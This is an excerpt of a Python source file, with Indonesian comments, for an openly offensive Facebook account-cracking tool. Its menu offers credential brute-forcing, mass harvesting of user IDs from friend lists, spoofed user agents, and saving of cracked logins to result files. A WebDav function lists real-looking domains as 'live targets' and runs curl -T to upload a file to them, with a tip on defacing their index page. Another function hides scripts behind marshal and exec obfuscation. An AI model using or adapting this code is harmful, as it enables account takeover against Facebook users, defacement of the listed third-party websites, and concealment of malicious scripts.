#####-----[ INI IMPORT MODULE ]-----#####
import requests,bs4,json,os,sys,random,datetime,time,re,rich,marshal
...
for c in range(100):
    rr = random.randint
    chrome = str(rr(73, 100))+".0."+str(rr(4200, 4900))+"."+str(rr(40, 150))
    user_agent.append(f"Mozilla/5.0 (Linux; Android 6.0.1; SM-A500H Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome} Mobile Safari/537.36 [FBAN/EMA;FBLC/es_LA;FBAV/361.0.0.12.5;]")
    chrome = str(rr(73, 100))+".0."+str(rr(4200, 4900))+"."+str(rr(40, 150))
    user_agent.append(f"Mozilla/5.0 (Linux; Android 6.0.1; SM-A910F Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome} Mobile Safari/537.36 [FBAN/EMA;FBLC/pt_BR;FBAV/360.0.0.7.53;]")
    chrome = str(rr(73, 100))+".0."+str(rr(4200, 4900))+"."+str(rr(40, 150))
    user_agent.append(f"Mozilla/5.0 (Linux; Android 6.0.1; SM-G610F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome} Mobile Safari/537.36 [FBAN/EMA;FBLC/en_GB;FBAV/361.0.0.12.5;]")
    chrome = str(rr(73, 100))+".0."+str(rr(4200, 4900))+"."+str(rr(40, 150))
    user_agent.append(f"Mozilla/5.0 (Linux; Android 6.0.1; vivo Y55 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome} Mobile Safari/537.36 [FBAN/EMA;FBLC/es_LA;FBAV/294.0.0.12.118;]")
    chrome = str(rr(73, 100))+".0."+str(rr(4200, 4900))+"."+str(rr(40, 150))
    user_agent.append(f"Mozilla/5.0 (Linux; Android 6.0; Lenovo A7000-a Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome} Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/359.0.0.11.81;]")
    chrome = str(rr(73, 100))+".0."+str(rr(4200, 4900))+"."+str(rr(40, 150))
    user_agent.append(f"Mozilla/5.0 (Linux; Android 6.0; Redmi Note 4 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome} Mobile Safari/537.36 [FBAN/EMA;FBLC/pt_BR;FBAV/361.0.0.12.5;]")
    chrome = str(rr(73, 100))+".0."+str(rr(4200, 4900))+"."+str(rr(40, 150))
    user_agent.append(f"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG-SM-G928A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome} Mobile Safari/537.36 [FBAN/EMA;FBLC/ms_MY;FBAV/345.0.0.3.69;]")
    chrome = str(rr(73, 100))+".0."+str(rr(4200, 4900))+"."+str(rr(40, 150))
    user_agent.append(f"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/N2G47F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome} Mobile Safari/537.36 [FBAN/EMA;FBLC/de_DE;FBAV/255.0.0.8.119;]")
    chrome = str(rr(73, 100))+".0."+str(rr(4200, 4900))+"."+str(rr(40, 150))
    user_agent.append(f"Mozilla/5.0 (Linux; Android 4.4.2; LG-F460K Build/KOT49I.F460K11e) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome} Mobile Safari/537.36 [FBAN/EMA;FBLC/sq_AL;FBAV/361.0.0.12.5;]")
    # Jika Kamu Ingin Menambah User agent Kamu Cukup Fahami Cara Di Atas
...
###--------[ INI FUNGSI HAPUS LOGIN ]--------###
def hapus_login():os.system('rm .cookie.txt .token.txt')
...
def listmenu():
    ...
    logo()
    tumbal()
    rprint(Panel("1. crack publik 2. Dump id Massal 3. Brute Force 4. User-Agent Settings 5. WebDav 6.cek Hasil 7. Enc Marshal 00. exit"))
...
###----[ ANIMATION TRUE ]-----###
def progv1():
    signal = random.randint(100, 500)
    for c in range(10):
        time.sleep(1)
        load = ['\\','-','/','|']
        sys.stdout.write(f"\r{putih}[ {hijau}" + load[c % len(load)]+ f"{putih} ] Running {loop} ok = {hijau}{ok}{putih} cp = {kuning}{cp}{putih} [ {hijau}{signal}{putih} ]");sys.stdout.flush()
...
def progv2():
    for c in range(10):
        time.sleep(1)
        load = ['\\','-','/','|']
        sys.stdout.write(f"\r{putih}[{hijau}] "+ load[c % len(load)]+ f"{putih} ] Running {loop} ok = {hijau}{ok} {putih}cp = {kuning}{cp} {putih}[ {merah}999 {putih}]");sys.stdout.flush()
...
def play_crack(ids,pws):
	...
	progv1()
	#sys.stdout.write(f'\r{putih}* Running {loop} OK = {hijau}{ok}{putih} CP = {kuning}{cp}{putih} [ {hijau}{signal}{putih} ]');sys.stdout.flush()
	for pw in pws:
		try:
		    ...
		    if "checkpoint" in post.cookies.get_dict().keys():
		       ...
		       progv2()
		       #sys.stdout.write(f'\r{putih}* Running {loop} OK = {hijau}{ok}{putih} CP = {kuning}{cp} {putih}[ {merah}999 {putih}]');sys.stdout.flush()
		       time.sleep(10)
	loop+=1
####-----[ INI FUNGSI LIAT HASIL CRACK ]-----####
def list_hasil():
    dir_path = r'result/PICK-CP'# lokasi file
    file_cp = 0
    for path in os.listdir(dir_path):
        if os.path.isfile(os.path.join(dir_path, path)):
           file_cp += 1

    dir_ok = r'result/PICK-OK'
    file_ok = 0
    for no in os.listdir(dir_ok):
        if os.path.isfile(os.path.join(dir_ok, no)):
            file_ok += 1
            
    index = []
    A = Text(f"KAMU MEMILIKI {file_ok} FILE OK",justify='center')
    B = Panel(A,width=44,subtitle='01')
    C = Text(f"KAMU MEMILIKI {file_cp} FILE CP",justify='center')
    D = Panel(C,width=43,subtitle='02')
    index.append(B);index.append(D)
    rprint(column(index))
    put = input('* choose : ')
    if put in ['01','1']:
       list_ok()
...
def review_file_cp():
    try:
        ...
        hasil = open(f'./result/PICK-CP/{nama_file}').readlines()
        for cp in hasil:
            print(f'\n* {cp}')
            input('[ ENTER FOR BACK ]');back()
    except:
           print('file tidak di temukan !!')
def review_file_ok():
    try:
         nama_file = input('* Masukan Nama File : ')
         hasil = open(f'./result/PICK-OK/{nama_file}').readlines()
         for ok in hasil:
             print(f'\n* {ok}')
             input('[ ENTER FOR BACK ]');back()
    except:
    ...
    try:
        for get in data['friends']['data']:
            theid.append(get['id']+'|'+get['name'])
               ...
               print('Id Tidak Publik');time.sleep(3)
               back()
...
def web_dav():
    live = """
    > http://www.mta-sts.fw2a.liquidchefsworld.com
    > http://mta-sts.fw1a.liquidchefs.biz
    > http://mta-sts.fw1a.liquidchefs.mobi
    > http://www.stitchaccounting.co.za
    > http://www.n8tive.co.za
    > http://www.nhsgilde.co.za
    > http://mariongeiger.com
    """
    rprint(Panel(live,title='[ LIVE TARGET ]'))
    note=Text('JIKA INGIN MENYERANG INDEX UBAH NAMA FILE MENJADI index.html',justify='center')
    rprint(Panel(note))
    try:
        file = input('* File : ')
        target = input('* target : ')
        os.system(f'curl -T {file} {target}')
        print(f'[ Succes ] {target}/{file}')
    except Exception :
           print('Gagal')
...
def enc_marshal():
	try:
		...
		m = marshal.dumps(a)
		s = repr(m)
		wm = "#####-----[ ENCRIPTION BY PICK FORD ]-----####"
		wm2 = "#####-----[   WA : 6283806211924    ]-----####"
		b = (f'import marshal\n{wm}\n{wm2}\nexec(marshal.loads(' + s +'))')
		c = file.replace('.py', '-encription.py')
		d = open(c, 'w')
		d.write(b)
		d.close()
		print (f'[ succes ] {c}')
